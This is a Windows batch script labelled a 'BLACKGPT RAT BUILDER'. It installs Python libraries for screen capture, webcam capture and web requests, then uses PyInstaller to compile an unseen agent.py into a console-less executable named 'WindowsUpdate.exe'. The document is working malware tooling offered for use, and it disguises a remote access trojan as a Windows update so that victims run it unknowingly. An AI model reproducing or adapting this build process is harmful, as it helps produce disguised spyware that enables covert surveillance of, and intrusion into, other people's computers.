@echo off
title BLACKGPT RAT BUILDER
color 0a

echo ========================================
echo    BLACKGPT RAT CLIENT BUILDER
echo ========================================
echo.

echo [*] Checking Python installation...
python --version >nul 2>&1
if errorlevel 1 (
    echo [X] Python not found! Please install Python first.
    pause
    exit /b 1
)

echo [*] Installing/Updating pip...
python -m pip install --upgrade pip

echo [*] Installing dependencies...
pip install pillow mss opencv-python requests pyinstaller

echo.
echo [*] Building RAT client...
echo [*] This may take a few minutes...

REM Build dengan opsi terbaik
pyinstaller --onefile --noconsole --name=WindowsUpdate --clean agent.py

if errorlevel 1 (
    echo [X] Build failed! Trying alternative method...
    pyinstaller --onefile --noconsole agent.py
)

echo.
if exist "dist\WindowsUpdate.exe" (
    echo ========================================
    echo    BUILD SUCCESSFUL!
    echo ========================================
    echo.
    echo [✓] File location: dist\WindowsUpdate.exe
    echo [✓] File size: 
    dir dist\WindowsUpdate.exe | findstr "WindowsUpdate.exe"
    echo.
    echo [*] To test: cd dist ^&^& WindowsUpdate.exe
) else (
    if exist "dist\agent.exe" (
        echo [✓] Build successful as agent.exe
        echo [✓] File location: dist\agent.exe
    ) else (
        echo [X] Build failed! Check errors above.
    )
)

echo.
pause